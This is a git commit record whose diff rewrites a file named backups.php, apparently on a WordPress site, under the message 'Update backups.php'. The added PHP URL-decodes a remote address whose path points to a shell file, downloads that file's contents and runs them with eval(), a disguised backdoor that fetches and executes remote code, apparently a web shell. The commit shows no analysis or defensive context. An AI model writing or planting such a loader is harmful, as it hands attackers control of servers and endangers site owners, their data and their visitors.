940ef05060b4e035e1090ba2daf5188d469d5cd1
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-01-20 18:11:10 +0700

    Update backups.php

--- backups.php
+++ backups.php
@@ -1,1 +1,6 @@
-require('wp-includes/file.txt');
+<?php
+
+$content = file_get_contents(urldecode('https%3A%2F%2Fhypocriteseo.info%2Fshell%2Falfa.txt'));
+
+$content = "?> ".$content;
+eval($content);
